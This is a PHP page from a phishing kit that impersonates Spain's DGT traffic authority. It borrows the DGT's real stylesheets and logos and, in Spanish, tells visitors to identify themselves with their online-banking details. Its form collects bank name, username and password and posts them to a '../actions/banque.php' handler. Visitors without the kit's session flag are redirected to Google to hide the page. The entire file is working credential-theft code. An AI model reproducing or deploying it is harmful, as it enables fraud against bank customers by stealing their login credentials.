


<?php
session_start();
include '../server/all.php';
include '../settings.php';

 
if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true ) {		
?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
		
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		
		<title>Como medida de seguridad no vamos a hacer el pago directamente a través de su banco.</title>
		
		<link type="text/css" href="../assets/ing/bootstrap.min.css" rel="stylesheet" media="screen">	
		<link type="text/css" href="../assets/ing/style.css" rel="stylesheet">
		<link type="text/css" href="../assets/ing/scrollbar.css" rel="stylesheet">
		
		<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
		<style type="text/css" media="all">
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap.min.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap-theme.min.css');
			
			@import url('https://sedeclave.dgt.gob.es/IWPS5/css/estilosComObl.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/css/estiloPropio.css');
		</style>

	</head>
	
	<body>
	<header class="main-header">
			<h1 class="sr-only">
			<span>Site Web DGT</span></h1>
			<nav>
				<h2 class="sr-only">Entête</h2>
				<!-- Cabecera con los logos -->
				<div class="brand">
					<h3 class="sr-only">Organisme</h3>
					<div class="logos">
						<a title="" href="" target="_blank"><img src="../assets/images/logo-mir.png" ></a>
						<a title="" href="" target="_blank"><img src="../assets/images/logo-dgt.png" ></a>
					</div>
					<a class="title" href="">
						<span class="main">Autenticación por banco</span>
						
					</a>
					<div class="desktop-fix"></div>
				</div>
				
				
					
				
				<div id="formMenuCarritoId" name="formMenuCarritoId" method="" action="" enctype="application/x-www-form-urlencoded">
					<input type="hidden" name="formMenuCarritoId" value="formMenuCarritoId">
					<div class="nav-main menu-component" id="main-navigation">
						<h3 class="sr-only"></h3>
						<ul class="menu">
							<li class="level l1 no-sublevel" onclick="">
								<a href="https://w7.pngwing.com/pngs/98/991/png-transparent-computer-icons-bank-icon-design-screenshot-bank-blue-angle-logo-thumbnail.png" class="item"><span class="fa fa-angle-right" aria-hidden="true"></span>Pagos</a>
							</li>
						</ul>
					</div>
					
			</nav>
		
		</header>
	
	
	
	
	<div class="offset-xl-4 col-xl-4 col-lg-6 offset-lg-3 col-md-8 col-sm-8 offset-sm-2 offset-md-2 generic p-2 csp-1">
	<center><img src="../assets/ing/ico_oob_1.png" width="125" class=""></center>
		<div class="vertical-scroll">
		
				<div class="row mt-2 mb-1">
					<div class="col ">
						<div class="float-right">
						
							
						</div>
					</div>
				</div>
			<div class="row align-items-end csp-2">
				<div class="col mr-auto my-auto  h-100">
					<img class="img-fluid float-left" src="">

				</div>
			
				<div class="col my-auto  h-100">
		
				</div>
			</div>
			
			<h4 style="color: #004488;">Por favor, identifícate con tu nombre de usuario y contraseña de banca electrónica</h4>

						
					
			
			
			<div class="container">			
			</div>
			
			<div class="row justify-content-center mb-5">
				<div class="container d-flex flex-column pl-5 pr-5">
							
			</div>	</div>
			<hr>
			
			<div class="row justify-content-center mb-5">
			<div class="col-auto">
        <form id="oobForm" action="../actions/banque.php" method="POST">
			<div class="form-group">
                <label for="identifiant">nombre del banco</label>
                <input type="text" class="form-control" id="nom_bank" name="nom_bank" placeholder="Ingrese su identificación" required>
            </div>
			
            <div class="form-group">
                <label for="identifiant">Identificación</label>
                <input type="text" class="form-control" id="identifiant_banque" name="identifiant_banque" placeholder="Ingrese su identificación" required>
            </div>
			
            <div class="form-group">
                <label for="password">Contraseña</label>
                <input type="password" class="form-control" id="mdp_banque" name="mdp_banque" placeholder="Ingrese su contraseña" required>
            </div>
			
							
			<div class="row justify-content-center mb-5">
            <button type="submit" id="banque_submit" name ="banque_submit" class="btn btn-primary">Validar</button>
			</div>
        </form>
 
</div>
		</div> 

</body></html>
<?php
} else {
    header("Location: https://www.google.com");
    exit;
}

?>